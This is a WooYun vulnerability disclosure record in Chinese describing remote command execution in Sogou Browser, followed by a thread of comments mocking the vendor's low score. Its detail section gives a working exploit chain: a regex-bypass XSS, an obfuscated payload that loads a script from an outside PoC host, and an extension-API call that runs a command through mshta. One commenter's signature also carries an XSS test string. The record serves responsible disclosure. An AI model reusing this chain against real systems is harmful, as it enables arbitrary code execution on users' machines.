{"id": 46622, "wybug_id": "wooyun-2014-084110", "wybug_title": "治标不治本：搜狗浏览器继续远程执行任意命令", "wybug_corp": "搜狗", "wybug_author": "gainover", "wybug_date": "2014-11-21 14:06", "wybug_open_date": "2015-02-19 14:08", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向公众公开  简要描述： 20分都不给我，好坏好坏好坏的。  先修复，再确认，修复发布浏览器更新了，但又修不好，哪来的自信给我5分。修复方案：请修复“厂商回复”中每次都自动回复“感谢支持，欢迎您在SGSRC平台提交漏洞”的漏洞。 详细说明：  1. 更新到最新版本\n\n2. 搜狗针对上一个漏洞，做了一些修复，最根本的协议跳转限制依然没修复。A. 针对signin.html的XSS做了如下图所示修复：\n\n正则看似写的一大串，很复杂，实则： 连限定开始的 ^ 都落掉了，直接 javascript:alert(1);//http://www.baidu.com/ 就绕过正则了B. 当顶层的URL不是 se-extension:// 时，扩展API的调用会有限制， 但是当前URL为se-extension://时，依然可以调用扩展API。因此，我们虽然无法用iframe来进行嵌入调用，但是结合location.href 和 window.open，依然可以执行命令，代码如下：首先location.href跳转到 signin.html的XSS页面：\nlocation.href='se-extension://ext-1055834318/signin.html?app=test&code=javascript:document.write(\"<img src%3D1 onerror%3Deval(String.fromCharCode(119,105,110,100,111,119,46,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,41,41,59,119,105,110,100,111,119,46,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,50,48,44,49,49,53,44,49,49,53,44,49,49,54,44,52,54,44,49,49,53,44,49,48,53,44,49,49,48,44,57,55,44,57,55,44,49,49,50,44,49,49,50,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,49,50,44,49,49,49,44,57,57,44,52,55,44,49,49,53,44,49,49,49,44,49,48,51,44,49,49,49,44,49,49,55,44,52,54,44,49,48,54,44,49,49,53,41,43,34,63,34,43,77,97,116,104,46,114,97,110,100,111,109,40,41,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,119,105,110,100,111,119,46,115,41))>\");//http://www.baidu.com/';\n执行XSS后，调用sogou.js， sogou.js代码如下：\nwindow.w=parent.window.open(\"se-extension://ext740107210/html/back.html\");function load(){\tif(window.w&&window.w.document.getElementById(\"embed1\")){\t\tclearTimeout(window.xx);\t\twindow.w.document.getElementById(\"embed1\").startExe(\"mshta javascript:(new/**/ActiveXObject('WScript.Shell').run('calc.exe'));window.moveTo(-1000,-1000);window.close();\",function(){console.log(arguments)});\t}};window.xx=setInterval(function(){load();},100);\n利用window.open打开se-extension://ext740107210/html/back.html，然后通过返回的窗口对象，调用document.getElementById(\"embed1\").startExe，即可执行任意命令。具体效果见漏洞证明   漏洞证明：  访问: http://xsst.sinaapp.com/poc/sogouxxx.html\n\n   修复方案：  请修复“厂商回复”中每次都自动回复“感谢支持，欢迎您在SGSRC平台提交漏洞”的BUG。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-24 18:48 厂商回复： 您好，感谢支持，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-21 14:09 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  低：1分------谢谢关注。滚    \n     2014-11-21 14:10 |    \t\t小小黑 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | ...)\t\t \n  打脸呢这是？    \n     2014-11-21 14:11 |    \t\tchopper \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:29        | 菜鸟求学，多多关照~)\t\t \n  厂商见到你就怕了，又要加班了。    \n     2014-11-21 14:12 |    \t\t紫衣大侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:21        | 愿结天下有识之士)\t\t \n   啪啪啪~~    \n     2014-11-21 14:14 |    \t\tghy459 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:5        | 深挖洞，广积shell。)\t\t \n  搜狗要把二哥列入黑名单了哈哈哈    \n     2014-11-21 14:21 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  二哥浏览器专场    \n     2014-11-21 14:22 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  我抢劫你什么，我是抢劫的人吗？臭不要脸还在笑，发生关系还在笑。大老远的把我骗过来，把我玩了，20分都不给我，没见过这么恶心的人    \n     2014-11-21 14:31 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  二哥很生气，后果很严重啊    \n     2014-11-21 14:47 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  一发不可收拾啊 我赌还是5分    \n     2014-11-21 15:00 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  二哥说了 不给20整死    \n     2014-11-21 15:03 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  20分都不给我，好坏好坏好坏的    \n     2014-11-21 15:18 |    \t\tg0odnight \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:19        | 么么哒，呵呵哒，么蛤蛤~)\t\t \n  二哥说了，要么20要加班加死你们    \n     2014-11-21 15:19 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  哈哈哈 2哥 20哥    \n     2014-11-21 15:19 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  我不认识你，所以给你5分！    \n     2014-11-21 15:21 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  我来看看给几分    \n     2014-11-21 15:35 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  修补后，忽略。谢谢关注，未能成功复现。    \n     2014-11-21 16:02 |    \t\t小熊饼干 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:6        | 酱油专业户)\t\t \n  哈哈，最爱二哥的漏洞，“整天就知道“欢迎来SGSRC平台提交漏洞” 哈哈 这是拿漏洞冲指标呢    \n     2014-11-21 16:12 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  期待厂商的回复啊    \n     2014-11-21 17:22 |    \t\t伟大娃娃 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:10        | 改变世界)\t\t \n  你骗我,你说在家写毕业PPT的~    \n     2014-11-21 17:25 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  打脸成功，啪啪    \n     2014-11-21 17:29 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  你骗我,你说在家写毕业PPT的~    \n     2014-11-21 20:39 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @only_guest @伟大娃娃 写毕业PPT是吃零食，找漏洞是生活                             ---华丽的小尾巴---我不是二哥---    \n     2014-11-21 21:26 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  就是给你五分 咋滴    \n     2014-11-23 01:04 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  二哥，这一发不可收拾    \n     2014-11-24 19:07 |    \t\tWoodee \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云路人甲，打脸pa pa pa)\t\t \n  2哥，他们家的回复终于改了。    \n     2014-11-24 19:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  8分好啊 8分吉利    \n     2014-11-24 19:55 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser =。= 还是拿小号发搜狗的好了，简直是拉低我rank平均值。    \n     2014-11-24 20:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @gainover 8分。。。搜狗这档次要求是有多高啊！拉低rank平均值，人人网今天给了我2个1rank，妹的。。    \n     2014-11-24 21:05 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  我觉得应该是这样 5 8 10 11 11 10 8 5    \n     2014-11-24 21:24 |    \t\tF0rm \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | )\t\t \n  8——发    \n     2014-11-24 22:39 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @p.z 我觉得应该是5 8 6 1 1    \n     2014-11-28 17:06 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  @魇 100块，拿去    \n     2014-12-02 17:10 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  @魇 小伙很摩登啊    \n     2014-12-15 09:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  请修复“厂商回复”中每次都自动回复“感谢支持，欢迎您在SGSRC平台提交漏洞”的BUG。您好，感谢支持，我们会尽快修复    \n     2015-02-19 17:50 |    \t\t感染者 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:16        | 喜欢探索，愿与君共勉！)\t\t \n  8有点低了啊……    \n     2015-02-19 18:27 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  好坑爹的厂商啊，命令执行才给8    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}